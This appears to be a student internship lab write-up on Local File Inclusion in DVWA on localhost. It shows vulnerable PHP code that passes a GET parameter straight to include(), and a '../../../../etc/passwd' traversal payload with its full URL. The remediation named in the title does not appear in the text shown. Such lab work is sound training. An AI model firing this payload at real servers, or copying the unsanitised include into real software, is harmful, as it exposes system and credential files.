# Local File Inclusion (LFI) Assessment & Remediation

**Internship Program:** Cybersecurity & Ethical Hacking (ApexPlanet)  
**Task Module:** Task 3 – Web Application Security  
**Target Application:** Damn Vulnerable Web Application (DVWA)  
**Security Level:** Low  
**Vulnerability Classification:** CWE-98 (Improper Control of Filename for Include/Require) / CWE-22 (Path Traversal)  

---

## 1. Vulnerability Overview
Local File Inclusion (LFI) occurs when an application accepts user input to determine a file path and passes it directly to server-side file inclusion functions (e.g., `include`, `require`) without validation or path sanitization.

* **Target URL:** `http://127.0.0.1/DVWA/vulnerabilities/fi/`
* **Vulnerable Parameter:** `page` (HTTP GET request)

---

## 2. Insecure Source Code (Root Cause Analysis)
The application takes the value of `$_GET['page']` and directly executes PHP's `include()` function, enabling directory traversal sequences:

```php
// Insecure LFI Source Code (DVWA Low Level)
$file = $_GET['page'];

// Directly including the supplied path
include($file);
```
## 3. Attack Payloads & Exploitation Walkthrough
**3.1 Directory Traversal to Read Sensitive System Files**
* **Payload:**

```Plaintext
../../../../etc/passwd
```
* **Full URL:**
```Plaintext
[http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd](http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd)
```
* **Mechanism:** The ../ sequence traverses up the Linux directory hierarchy from the `/var/www/html/dvwa/vulnerabilities/fi/` webroot to the root directory /, reading `/etc/passwd` directly.


